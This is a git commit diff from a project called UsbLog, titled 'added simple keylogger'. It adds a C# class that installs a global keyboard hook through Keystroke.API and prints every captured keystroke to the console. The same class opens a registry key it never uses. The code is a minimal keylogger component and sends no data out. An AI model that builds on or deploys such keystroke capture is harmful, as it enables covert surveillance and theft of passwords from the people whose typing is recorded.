9f35650ea03347386daf13887a57523ca9abccff
Furesoft <filmee24@gmail.com>
2020-02-15 09:46:04 +0100

    added simple keylogger

---
+++ UsbLog/UsbLog.Service/Tasks/CollectKeysTask.cs
@@ -0,0 +1,24 @@
+﻿using DiscUtils.Registry;
+using Keystroke.API;
+using System;
+using UsbLog.Core;
+using UsbLog.VM;
+
+namespace UsbLog.Service.Tasks
+{
+    internal class CollectKeysTask : IVmTask
+    {
+        public int ID => 0xCE13;
+
+        public void Invoke(RegistryKey root)
+        {
+            var keysHive = root.OpenSubKey("/data/keys");
+
+            var api = new KeystrokeAPI();
+
+            api.CreateKeyboardHook((character) => { Console.Write(character); });
+
+            DisposePipe.Add(api);
+        }
+    }
+}
